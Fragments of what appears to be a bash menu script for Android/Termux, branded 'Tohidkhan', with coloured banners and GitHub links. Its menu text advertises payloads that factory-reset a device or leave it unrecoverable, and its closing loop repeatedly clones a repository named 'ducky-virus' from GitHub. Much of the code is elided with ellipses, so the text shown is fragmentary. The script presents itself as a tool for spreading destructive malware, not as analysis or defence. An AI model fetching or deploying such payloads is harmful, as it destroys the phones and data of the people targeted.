...
'
echo " " 
echo -e "$red #$pink Tohidkhan$grn $red#$rset"
echo 
# Functions
...
then
am start -a android.intent.action.VIEW -d https:tohidkhan6332 > /dev/null 2>&1
banner
menu
elif [ $optnz = "5" ];
then
...
device it will be factory reset and lot more happens.
         ...
         \e[92mL1NK :- \e[96mhttps://github.com/tohidkhan6332\e[91m
...
device will not be recovered.(Antivirus)
        ...
        \e[92mL1NK :- \e[96mhttps://github.com/tohidkhan6332\e[93m
...
echo -e '\e[91m
  ...
  ||    ||
'
echo -e "\e[93m             ADMIN OF \e[92mMrtohid" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         Keep Supporting And Join Us " | pv -qL 10
echo -e "\e[93m         Join Us:\e[92m https://github.com/tohidkhan6332[0m" | pv -qL 10
sleep 6.0
banner
menu
}
...
while git clone https://github.com/tohidkhan6332/ducky-virus 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
